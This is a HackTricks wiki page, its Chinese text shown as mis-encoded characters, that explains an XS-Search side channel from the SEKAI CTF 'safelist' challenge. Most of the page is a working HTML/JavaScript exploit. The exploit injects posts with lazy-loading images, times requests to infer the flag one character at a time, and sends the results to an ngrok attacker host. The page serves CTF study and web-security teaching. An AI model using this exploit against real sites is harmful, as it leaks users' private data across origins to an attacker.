<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Event Loop Blocking + Lazy images</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="event-loop-blocking--lazy-images"><a class="header" href="#event-loop-blocking--lazy-images">Event Loop Blocking + Lazy images</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<p>åœ¨ <a href="https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45"><strong>è¿™ä¸ªæ¼æ´</strong></a> ä¸­ï¼Œ <a href="https://twitter.com/aszx87410"><strong>@aszx87410</strong></a> é€šè¿‡ HTML æ³¨å…¥æ··åˆäº† <strong>æ‡’åŠ è½½å›¾åƒä¾§ä¿¡é“</strong> æŠ€æœ¯å’ŒæŸç§ <strong>äº‹ä»¶å¾ªç¯é˜»å¡æŠ€æœ¯</strong> æ¥æ³„éœ²å­—ç¬¦ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ª <strong>ä¸åŒçš„æ¼æ´</strong>ï¼Œç”¨äº CTF æŒ‘æˆ˜ï¼Œå·²ç»åœ¨ä»¥ä¸‹é¡µé¢ä¸­è¯„è®ºè¿‡ã€‚è¯·æŸ¥çœ‹ä»¥è·å–æœ‰å…³æŒ‘æˆ˜çš„æ›´å¤šä¿¡æ¯ï¼š</p>
<p>{% content-ref url="connection-pool-example.md" %}
<a href="connection-pool-example.html">connection-pool-example.md</a>
{% endcontent-ref %}</p>
<p>è¿™ä¸ªæ¼æ´èƒŒåçš„æƒ³æ³•æ˜¯ï¼š</p>
<ul>
<li>å¸–å­æŒ‰å­—æ¯é¡ºåºåŠ è½½</li>
<li>ä¸€ä¸ª <strong>æ”»å‡»è€…</strong> å¯ä»¥ <strong>æ³¨å…¥</strong> ä¸€ä¸ªä»¥ <strong>"A"</strong> å¼€å¤´çš„ <strong>å¸–å­</strong>ï¼Œç„¶åä¸€äº› <strong>HTML æ ‡ç­¾</strong>ï¼ˆå¦‚ä¸€ä¸ªå¤§çš„ <strong><code>&lt;canvas</code></strong>ï¼‰å°†å æ®å¤§éƒ¨åˆ† <strong>å±å¹•</strong>ï¼Œä»¥åŠä¸€äº›æœ€ç»ˆçš„ <strong><code>&lt;img lazy</code> æ ‡ç­¾</strong> æ¥åŠ è½½å†…å®¹ã€‚</li>
<li>å¦‚æœæ”»å‡»è€…æ³¨å…¥çš„å¸–å­æ˜¯ä»¥ "z" å¼€å¤´çš„åŒä¸€ä¸ªå¸–å­ï¼Œå¸¦æœ‰ <strong>æ ‡å¿—</strong> çš„ <strong>å¸–å­</strong> å°†ä¼š <strong>é¦–å…ˆ</strong> å‡ºç°ï¼Œç„¶å <strong>æ³¨å…¥çš„</strong> <strong>å¸–å­</strong> å°†ä»¥åˆå§‹ "z" å’Œ <strong>å¤§</strong> <strong>canvas</strong> å‡ºç°ã€‚å› ä¸ºå¸¦æœ‰æ ‡å¿—çš„å¸–å­é¦–å…ˆå‡ºç°ï¼Œç¬¬ä¸€ä¸ª canvas å°†å æ®æ•´ä¸ªå±å¹•ï¼Œæœ€ç»ˆæ³¨å…¥çš„ <strong><code>&lt;img lazy</code></strong> æ ‡ç­¾å°† <strong>ä¸ä¼šåœ¨</strong> å±å¹•ä¸Š <strong>æ˜¾ç¤º</strong>ï¼Œå› æ­¤å®ƒä»¬ <strong>ä¸ä¼šè¢«åŠ è½½</strong>ã€‚</li>
<li>ç„¶åï¼Œ<strong>å½“</strong> æœºå™¨äºº <strong>è®¿é—®</strong> é¡µé¢æ—¶ï¼Œ<strong>æ”»å‡»è€…</strong> å°† <strong>å‘é€è·å–è¯·æ±‚</strong>ã€‚ </li>
<li>å¦‚æœæ³¨å…¥çš„ <strong>å›¾åƒ</strong> æ­£åœ¨ <strong>åŠ è½½</strong>ï¼Œè¿™äº› <strong>è·å–</strong> è¯·æ±‚å°†éœ€è¦ <strong>æ›´é•¿çš„æ—¶é—´</strong>ï¼Œå› æ­¤æ”»å‡»è€…çŸ¥é“ <strong>å¸–å­åœ¨æ ‡å¿—ä¹‹å‰</strong>ï¼ˆæŒ‰å­—æ¯é¡ºåºï¼‰ã€‚</li>
<li>å¦‚æœ <strong>è·å–</strong> è¯·æ±‚æ˜¯ <strong>å¿«é€Ÿçš„</strong>ï¼Œè¿™æ„å‘³ç€ <strong>å¸–å­</strong> åœ¨æ ‡å¿— <strong>ä¹‹å</strong>ï¼ˆæŒ‰å­—æ¯é¡ºåºï¼‰ã€‚</li>
</ul>
<p>è®©æˆ‘ä»¬æ£€æŸ¥ä»£ç ï¼š</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;!--
The basic idea is to create a post with a lot of images which send request to "/" to block server-side nodejs event loop.
If images are loading, the request to "/" is slower, otherwise faster.
By using a well-crafted height, we can let note with "A" load image but note with "Z" not load.
We can use fetch to measure the request time.
--&gt;
&lt;body&gt;
&lt;button onclick="run()"&gt;start&lt;/button&gt;

&lt;!-- Inject post with payload --&gt;
&lt;form id=f action="http://localhost:1234/create" method="POST" target="_blank"&gt;
&lt;input id=inp name="text" value=""&gt;
&lt;/form&gt;

&lt;!-- Remove index --&gt;
&lt;form id=f2 action="http://localhost:1234/remove" method="POST" target="_blank"&gt;
&lt;input id=inp2 name="index" value=""&gt;
&lt;/form&gt;

&lt;script&gt;
let flag = 'SEKAI{'
const TARGET = 'https://safelist.ctf.sekai.team'
f.action = TARGET + '/create'
f2.action = TARGET + '/remove'

const sleep = ms =&gt; new Promise(r =&gt; setTimeout(r, ms))
// Function to leak info to attacker
const send = data =&gt; fetch('http://server.ngrok.io?d='+data)
const charset = 'abcdefghijklmnopqrstuvwxyz'.split('')

// start exploit
let count = 0
setTimeout(async () =&gt; {
let L = 0
let R = charset.length - 1

// I have omited code here as apparently it wasn't necesary

// fallback to linerar since I am not familiar with binary search lol
for(let i=R; i&gt;=L; i--) {
let c = charset[i]
send('try_' + flag + c)
const found = await testChar(flag + c)
if (found) {
send('found: '+ flag+c)
flag += c
break
}
}

}, 0)

async function testChar(str) {
return new Promise(resolve =&gt; {
/*
For 3350, you need to test it on your local to get this number.
The basic idea is, if your post starts with "Z", the image should not be loaded because it's under lazy loading threshold
If starts with "A", the image should be loaded because it's in the threshold.
*/
// &lt;canvas height="3350px"&gt; is experimental and allow to show the injected
// images when the post injected is the first one but to hide them when
// the injected post is after the post with the flag
inp.value = str + '&lt;br&gt;&lt;canvas height="3350px"&gt;&lt;/canvas&gt;&lt;br&gt;'+Array.from({length:20}).map((_,i)=&gt;`&lt;img loading=lazy src=/?${i}&gt;`).join('')
f.submit()

setTimeout(() =&gt; {
run(str, resolve)
}, 500)
})
}

async function run(str, resolve) {
// Open posts page 5 times
for(let i=1; i&lt;=5;i++) {
window.open(TARGET)
}

let t = 0
const round = 30 //Lets time 30 requests
setTimeout(async () =&gt; {
// Send 30 requests and time each
for(let i=0; i&lt;round; i++) {
let s = performance.now()
await fetch(TARGET + '/?test', {
mode: 'no-cors'
}).catch(err=&gt;1)
let end = performance.now()
t += end - s
console.log(end - s)
}
const avg = t/round
// Send info about how much time it took
send(str + "," + t + "," + "avg:" + avg)

/*
I get this threshold(1000ms) by trying multiple times on remote admin bot
for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold
*/
const isFound = (t &gt;= 1000)
if (isFound) {
inp2.value = "0"
} else {
inp2.value = "1"
}

// remember to delete the post to not break our leak oracle
f2.submit()
setTimeout(() =&gt; {
resolve(isFound)
}, 200)
}, 200)
}

&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/xs-search/performance.now-+-force-heavy-task.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/xs-search/javascript-execution-xs-leak.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/xs-search/performance.now-+-force-heavy-task.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/xs-search/javascript-execution-xs-leak.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
